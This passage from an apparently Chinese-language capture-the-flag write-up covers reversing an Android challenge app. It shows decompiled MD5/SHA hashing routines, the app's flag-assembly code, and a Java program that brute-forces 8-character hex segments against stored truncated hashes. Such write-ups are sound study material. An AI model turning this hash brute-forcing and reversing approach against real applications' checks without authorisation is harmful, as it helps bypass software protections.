class="string">&#x27;f&#x27;</span>&#125;;</span><br><span class="line">                <span class="keyword">char</span>[] v2_1 = <span class="keyword">new</span> <span class="keyword">char</span>[v0_13.length * <span class="number">2</span>];</span><br><span class="line">                <span class="keyword">int</span> v3_5 = v0_13.length;</span><br><span class="line">                <span class="keyword">int</span> v4_5 = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">int</span> v5_1 = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">while</span>(v4_5 &lt; v3_5) &#123;</span><br><span class="line">                    <span class="keyword">int</span> v6_1 = v0_13[v4_5];</span><br><span class="line">                    <span class="keyword">int</span> v8_1 = v5_1 + <span class="number">1</span>;</span><br><span class="line">                    v2_1[v5_1] = v1_12[v6_1 &gt;&gt;&gt; <span class="number">4</span> &amp; <span class="number">15</span>];</span><br><span class="line">                    v5_1 = v8_1 + <span class="number">1</span>;</span><br><span class="line">                    v2_1[v8_1] = v1_12[v6_1 &amp; <span class="number">15</span>];</span><br><span class="line">                    ++v4_5;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                v0_1 = <span class="keyword">new</span> String(v2_1);</span><br><span class="line">                <span class="keyword">return</span> v0_1 == <span class="keyword">null</span> ? <span class="keyword">null</span> : v0_1.substring(<span class="number">0</span>, <span class="number">16</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span>(NoSuchAlgorithmException v0_12) &#123;</span><br><span class="line">                v0_12.printStackTrace();</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(v1 == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(argBytes1.length != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                MessageDigest v1_9 = MessageDigest.getInstance(<span class="string">&quot;MD5&quot;</span>);</span><br><span class="line">                v1_9.update(argBytes1);</span><br><span class="line">                <span class="keyword">byte</span>[] v0_11 = v1_9.digest();</span><br><span class="line">                <span class="keyword">char</span>[] v1_10 = <span class="keyword">new</span> <span class="keyword">char</span>[]&#123;<span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;f&#x27;</span>&#125;;</span><br><span class="line">                <span class="keyword">char</span>[] v2 = <span class="keyword">new</span> <span class="keyword">char</span>[v0_11.length * <span class="number">2</span>];</span><br><span class="line">                <span class="keyword">int</span> v3_4 = v0_11.length;</span><br><span class="line">                <span class="keyword">int</span> v4_4 = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">int</span> v5 = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">while</span>(v4_4 &lt; v3_4) &#123;</span><br><span class="line">                    <span class="keyword">int</span> v6 = v0_11[v4_4];</span><br><span class="line">                    <span class="keyword">int</span> v8 = v5 + <span class="number">1</span>;</span><br><span class="line">                    v2[v5] = v1_10[v6 &gt;&gt;&gt; <span class="number">4</span> &amp; <span class="number">15</span>];</span><br><span class="line">                    v5 = v8 + <span class="number">1</span>;</span><br><span class="line">                    v2[v8] = v1_10[v6 &amp; <span class="number">15</span>];</span><br><span class="line">                    ++v4_4;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                v0_1 = <span class="keyword">new</span> String(v2);</span><br><span class="line">                <span class="keyword">return</span> v0_1 == <span class="keyword">null</span> ? <span class="keyword">null</span> : v0_1.substring(<span class="number">0</span>, <span class="number">16</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span>(NoSuchAlgorithmException v0_10) &#123;</span><br><span class="line">                v0_10.printStackTrace();</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(v1 == <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(argBytes1.length != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                MessageDigest v1_7 = MessageDigest.getInstance(<span class="string">&quot;SHA-1&quot;</span>);</span><br><span class="line">                v1_7.update(argBytes1);</span><br><span class="line">                <span class="keyword">byte</span>[] v0_9 = v1_7.digest();</span><br><span class="line">                StringBuilder v1_8 = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">                <span class="keyword">int</span> v3_3 = v0_9.length;</span><br><span class="line">                <span class="keyword">int</span> v4_3;</span><br><span class="line">                <span class="keyword">for</span>(v4_3 = <span class="number">0</span>; v4_3 &lt; v3_3; ++v4_3) &#123;</span><br><span class="line">                    v1_8.append(String.format(<span class="string">&quot;%02x&quot;</span>, ((<span class="keyword">byte</span>)v0_9[v4_3])));</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                v0_1 = v1_8.toString();</span><br><span class="line">                <span class="keyword">return</span> v0_1 == <span class="keyword">null</span> ? <span class="keyword">null</span> : v0_1.substring(<span class="number">0</span>, <span class="number">16</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span>(NoSuchAlgorithmException v0_8) &#123;</span><br><span class="line">                v0_8.printStackTrace();</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(v1 == <span class="number">3</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(argBytes1.length != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                MessageDigest v1_5 = MessageDigest.getInstance(<span class="string">&quot;SHA-224&quot;</span>);</span><br><span class="line">                v1_5.update(argBytes1);</span><br><span class="line">                <span class="keyword">byte</span>[] v0_7 = v1_5.digest();</span><br><span class="line">                StringBuilder v1_6 = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">                <span class="keyword">int</span> v3_2 = v0_7.length;</span><br><span class="line">                <span class="keyword">int</span> v4_2;</span><br><span class="line">                <span class="keyword">for</span>(v4_2 = <span class="number">0</span>; v4_2 &lt; v3_2; ++v4_2) &#123;</span><br><span class="line">                    v1_6.append(String.format(<span class="string">&quot;%02x&quot;</span>, ((<span class="keyword">byte</span>)v0_7[v4_2])));</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                v0_1 = v1_6.toString();</span><br><span class="line">                <span class="keyword">return</span> v0_1 == <span class="keyword">null</span> ? <span class="keyword">null</span> : v0_1.substring(<span class="number">0</span>, <span class="number">16</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span>(NoSuchAlgorithmException v0_6) &#123;</span><br><span class="line">                v0_6.printStackTrace();</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(v1 == <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(argBytes1.length != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                MessageDigest v1_3 = MessageDigest.getInstance(<span class="string">&quot;SHA-256&quot;</span>);</span><br><span class="line">                v1_3.update(argBytes1);</span><br><span class="line">                <span class="keyword">byte</span>[] v0_5 = v1_3.digest();</span><br><span class="line">                StringBuilder v1_4 = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">                <span class="keyword">int</span> v3_1 = v0_5.length;</span><br><span class="line">                <span class="keyword">int</span> v4_1;</span><br><span class="line">                <span class="keyword">for</span>(v4_1 = <span class="number">0</span>; v4_1 &lt; v3_1; ++v4_1) &#123;</span><br><span class="line">                    v1_4.append(String.format(<span class="string">&quot;%02x&quot;</span>, ((<span class="keyword">byte</span>)v0_5[v4_1])));</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                v0_1 = v1_4.toString();</span><br><span class="line">                <span class="keyword">return</span> v0_1 == <span class="keyword">null</span> ? <span class="keyword">null</span> : v0_1.substring(<span class="number">0</span>, <span class="number">16</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span>(NoSuchAlgorithmException v0_4) &#123;</span><br><span class="line">                v0_4.printStackTrace();</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(v1 == <span class="number">5</span> &amp;&amp; argBytes1.length != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            MessageDigest v1_1 = MessageDigest.getInstance(<span class="string">&quot;SHA-384&quot;</span>);</span><br><span class="line">            v1_1.update(argBytes1);</span><br><span class="line">            <span class="keyword">byte</span>[] v0_3 = v1_1.digest();</span><br><span class="line">            StringBuilder v1_2 = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">            <span class="keyword">int</span> v3 = v0_3.length;</span><br><span class="line">            <span class="keyword">int</span> v4;</span><br><span class="line">            <span class="keyword">for</span>(v4 = <span class="number">0</span>; v4 &lt; v3; ++v4) &#123;</span><br><span class="line">                v1_2.append(String.format(<span class="string">&quot;%02x&quot;</span>, ((<span class="keyword">byte</span>)v0_3[v4])));</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            v0_1 = v1_2.toString();</span><br><span class="line">            <span class="keyword">return</span> v0_1 == <span class="keyword">null</span> ? <span class="keyword">null</span> : v0_1.substring(<span class="number">0</span>, <span class="number">16</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(NoSuchAlgorithmException v0_2) &#123;</span><br><span class="line">            v0_2.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>flag生成<br>flag的生成如下，不过没怎么关注，因为爆破不需要关注这些。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> ind4;</span><br><span class="line"><span class="keyword">for</span>(ind4 = <span class="number">0</span>; ind4 &lt; <span class="number">8</span>; ++ind4) &#123;</span><br><span class="line">    <span class="keyword">byte</span>[] clips_i_bytes = a.hex2Bytes(clips[ind4]);</span><br><span class="line">    <span class="keyword">int</span> ind5 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> rndKey1 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(ind5 &lt; clips_i_bytes.length) &#123;</span><br><span class="line">        rndKey1 = rndKey1 &lt;&lt; <span class="number">1</span> | (clips_i_bytes[ind5] &amp; <span class="number">0x80</span>) &gt;&gt;&gt; <span class="number">7</span>;</span><br><span class="line">        clips_i_bytes[ind5] = (<span class="keyword">byte</span>)(clips_i_bytes[ind5] &amp; <span class="number">0x7F</span>);</span><br><span class="line">        ++ind5;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>((rndKey1 &gt;&gt;&gt; <span class="number">3</span> &amp; <span class="number">1</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">int</span> ind6;</span><br><span class="line">        <span class="keyword">for</span>(ind6 = <span class="number">0</span>; ind6 &lt; clips_i_bytes.length / <span class="number">2</span>; ++ind6) &#123;</span><br><span class="line">            <span class="keyword">byte</span> v11 = clips_i_bytes[ind6];</span><br><span class="line">            clips_i_bytes[ind6] = clips_i_bytes[clips_i_bytes.length - <span class="number">1</span> - ind6];  <span class="comment">// 把clips_i_bytes倒序一下</span></span><br><span class="line">            clips_i_bytes[clips_i_bytes.length - <span class="number">1</span> - ind6] = v11;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    flag_mat[rndKey1 &amp; <span class="number">7</span>] = <span class="keyword">new</span> String(clips_i_bytes);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">StringBuilder finalFlag = <span class="keyword">new</span> StringBuilder();</span><br><span class="line"><span class="keyword">while</span>(v3 &lt; <span class="number">8</span>) &#123;</span><br><span class="line">    finalFlag.append(flag_mat[v3]);</span><br><span class="line">    ++v3;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">v0_1.setText(finalFlag.toString());</span><br></pre></td></tr></table></figure></li><li><p>爆破<br>爆破的形式多种多样，最方便的当然是用Frida直接Hook爆破，无奈手机计算性能不够。<br>在PC上也不行，因为每个clip一共要尝试268435456个可能。<br>于是我找了个12核的工作站来跑，每秒大概可以尝试262144个可能，十多分钟就能跑出来一个clip。<br>开8个同时找，也能很快出结果。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.math.BigInteger;</span><br><span class="line"><span class="keyword">import</span> java.security.InvalidKeyException;</span><br><span class="line"><span class="keyword">import</span> java.security.MessageDigest;</span><br><span class="line"><span class="keyword">import</span> java.security.NoSuchAlgorithmException;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.Mac;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.SecretKeySpec;</span><br><span class="line"><span class="comment">// 爆破第二个clip</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">m1micXctfHaha</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[][] SpecBytesMat =&#123;  hex2Bytes(<span class="string">&quot;2bf07832853b16d0339f1a43900c3481&quot;</span>),</span><br><span class="line">                                            hex2Bytes(<span class="string">&quot;35aaae7322e0e37f3ba0fbcb25981aa7&quot;</span>),</span><br><span class="line">                                            hex2Bytes(<span class="string">&quot;ccb8cc2b84ac701819b738255f518c2d&quot;</span>),</span><br><span class="line">                                            hex2Bytes(<span class="string">&quot;663b77d67c17a0a8d4f12acf35aba2b4&quot;</span>),</span><br><span class="line">                                            hex2Bytes(<span class="string">&quot;9f3a3227ce8bd38475cf317347874d11&quot;</span>),</span><br><span class="line">                                            hex2Bytes(<span class="string">&quot;c08ba12183ecabc899c3957675e28cd9&quot;</span>),</span><br><span class="line">                                            hex2Bytes(<span class="string">&quot;6d330eef823b5c741e37f978488890b1&quot;</span>),</span><br><span class="line">                                            hex2Bytes(<span class="string">&quot;9e99c54e9dcea758cecf0d4cc18a0c22&quot;</span>)&#125;;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span>[] rndKeys = &#123;<span class="number">4</span>,<span class="number">10</span>,<span class="number">15</span>,<span class="number">1</span>,<span class="number">14</span>,<span class="number">5</span>,<span class="number">11</span>,<span class="number">8</span>&#125;;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String[] clips_i_hash_mat=&#123; <span class="string">&quot;fc7466e55fbf37b1&quot;</span>, <span class="string">&quot;78b0be39e63b6837&quot;</span>, <span class="string">&quot;c2f9c805d0442203&quot;</span>, <span class="string">&quot;c11a61bb60d79dab&quot;</span>, <span class="string">&quot;869e650ee55bd9f6&quot;</span>, <span class="string">&quot;f2dda5fc021fe2bf&quot;</span>, <span class="string">&quot;305044db48fe6174&quot;</span>, <span class="string">&quot;d6659b5e2d1059f8&quot;</span>&#125;;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String charset3 = <span class="string">&quot;01234567&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String charset4 = <span class="string">&quot;0123456789abcdef&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> c0=<span class="number">0</span>;c0&lt;<span class="number">8</span>;c0++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> c1=<span class="number">0</span>;c1&lt;<span class="number">16</span>;c1++)&#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> c2=<span class="number">0</span>;c2&lt;<span class="number">8</span>;c2++)&#123;</span><br><span class="line"></span><br><span class="line">                    String clip_now = <span class="string">&quot;&quot;</span> + charset3.charAt(c0)+charset4.charAt(c1)+charset3.charAt(c2);</span><br><span class="line">                    System.out.println(clip_now);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">for</span>(<span class="keyword">int</span> c3=<span class="number">0</span>;c3&lt;<span class="number">16</span>;c3++)&#123;</span><br><span class="line">                        <span class="keyword">for</span>(<span class="keyword">int</span> c4=<span class="number">0</span>;c4&lt;<span class="number">8</span>;c4++)&#123;</span><br><span class="line">                            <span class="keyword">for</span>(<span class="keyword">int</span> c5=<span class="number">0</span>;c5&lt;<span class="number">16</span>;c5++)&#123;</span><br><span class="line">                                <span class="keyword">for</span>(<span class="keyword">int</span> c6=<span class="number">0</span>;c6&lt;<span class="number">8</span>;c6++)&#123;</span><br><span class="line">                                    <span class="keyword">for</span>(<span class="keyword">int</span> c7=<span class="number">0</span>;c7&lt;<span class="number">16</span>;c7++)&#123;</span><br><span class="line">                                        String clip = <span class="string">&quot;&quot;</span>+charset3.charAt(c0)+charset4.charAt(c1)+charset3.charAt(c2)+charset4.charAt(c3)+charset3.charAt(c4)+charset4.charAt(c5)+charset3.charAt(c6)+charset4.charAt(c7);</span><br><span class="line">                                        <span class="comment">// String clip = &quot;00010567&quot;;</span></span><br><span class="line">                                        <span class="keyword">byte</span>[] clip_bytes = hex2Bytes(clip);</span><br><span class="line">                                        String clip_i_hash = hash_int_string_add0_0_16(<span class="number">10</span>, clip_bytes);</span><br><span class="line"></span><br><span class="line">                                        <span class="comment">// if(clip_i_hash==null)&#123;</span></span><br><span class="line">                                        <span class="comment">//     continue;</span></span><br><span class="line">                                        <span class="comment">// &#125;</span></span><br><span class="line">                                        </span><br><span class="line">                                        <span class="comment">// System.out.println(&quot;clip: &quot;, clip);</span></span><br><span class="line">                                        <span class="comment">// System.out.println(&#x27;clip_i_hash: &#x27;, clip_i_hash);</span></span><br><span class="line">                                        <span class="comment">// return ;</span></span><br><span class="line"></span><br><span class="line">                                        <span class="keyword">if</span>(clip_i_hash.equals(<span class="string">&quot;78b0be39e63b6837&quot;</span>))&#123;</span><br><span class="line">                                            System.out.println(<span class="string">&quot;+++++++\nclip1: &quot;</span> + clip + <span class="string">&quot;rndKeyi=&quot;</span> + <span class="number">10</span>);</span><br><span class="line">                                            System.out.println(<span class="string">&quot;clip_i_hash: &quot;</span> + clip_i_hash);</span><br><span class="line">                                            <span class="keyword">return</span> ;</span><br><span class="line">                                        &#125;</span><br><span class="line">                                    </span><br><span class="line">                                    &#125;</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;   </span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">hash_int_string_add0_0_16</span><span class="params">(<span class="keyword">int</span> argRndKey, <span class="keyword">byte</span>[] argBytes)</span> </span>&#123;</span><br><span class="line">        String v0_1;</span><br><span class="line">        <span class="keyword">byte</span>[] argBytes1 = argBytes;</span><br><span class="line">        <span class="keyword">if</span>((argRndKey &gt;&gt;&gt; <span class="number">3</span> &amp; <span class="number">1</span>) == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">switch</span>(argRndKey &amp; <span class="number">7</span>) &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">0</span>: &#123;</span><br><span class="line">                    v0_1 = SHA512_int_String_add0(argBytes1, SpecBytesMat[<span class="number">0</span>]);</span><br><span class="line">                    <span class="keyword">return</span> v0_1 == <span class="keyword">null</span> ? <span class="keyword">null</span> : v0_1.substring(<span class="number">0</span>, <span class="number">16</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">1</span>: &#123;</span><br><span class="line">                    v0_1 = SHA512_int_String_add0(argBytes1, SpecBytesMat[<span class="number">1</span>]);</span><br><span class="line">                    <span class="keyword">return</span> v0_1 == <span class="keyword">null</span> ? <span class="keyword">null</span> : v0_1.substring(<span class="number">0</span>, <span class="number">16</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">2</span>: &#123;</span><br><span class="line">                    v0_1 = SHA512_int_String_add0(argBytes1, SpecBytesMat[<span class="number">2</span>]);</span><br><span class="line">                    <span class="keyword">return</span> v0_1 == <span class="keyword">null</span> ? <span class="keyword">null</span> : v0_1.substring(<span class="number">0</span>, <span class="number">16</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">3</span>: &#123;</span><br><span class="line">                    v0_1 = SHA512_int_String_add0(argBytes1, SpecBytesMat[<span class="number">3</span>]);</span><br><span class="line">                    <span class="keyword">return</span> v0_1 == <span class="keyword">null</span> ? <span class="keyword">null</span> : v0_1.substring(<span class="number">0</span>, <span class="number">16</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">4</span>: &#123;</span><br><span class="line">                    v0_1 = SHA512_int_String_add0(argBytes1, SpecBytesMat[<span class="number">4</span>]);</span><br><span class="line">                    <span class="keyword">return</span> v0_1 == <span class="keyword">null</span> ? <span class="keyword">null</span> : v0_1.substring(<span class="number">0</span>, <span class="number">16</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">5</span>: &#123;</span><br><span class="line">                    v0_1 = SHA512_int_String_add0(argBytes1, SpecBytesMat[<span 